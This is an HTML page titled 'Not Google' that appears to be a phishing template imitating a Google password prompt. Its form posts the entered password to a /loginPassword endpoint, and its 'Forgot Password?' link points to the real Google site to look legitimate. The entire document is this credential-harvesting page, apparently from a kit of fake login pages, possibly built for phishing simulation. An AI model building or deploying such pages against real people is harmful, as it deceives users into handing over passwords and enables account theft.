<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Not Google</title>
    <link rel="stylesheet" href="/logins/notGoogle/styleSheet.css" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <script src="/logins/notGoogle/script.js"></script>
  </head>

  <body>
    <main>
      <section>
        <img src="/logins/notGoogle/notGoogle.png" alt="Not Google" />
        <h2>Hello</h2>
        <p>Enter your Password:</p>
        <form action="/loginPassword" method="post">
          <input type="text" id="password" name="password" required />
          <div class="flex-container">
            <div>
              <p style="float: left">
                <a href="https://www.google.com/">Forgot Password?</a>
              </p>
            </div>
            <div><input type="submit" value="Next" /></div>
          </div>
        </form>
      </section>
    </main>
  </body>
</html>
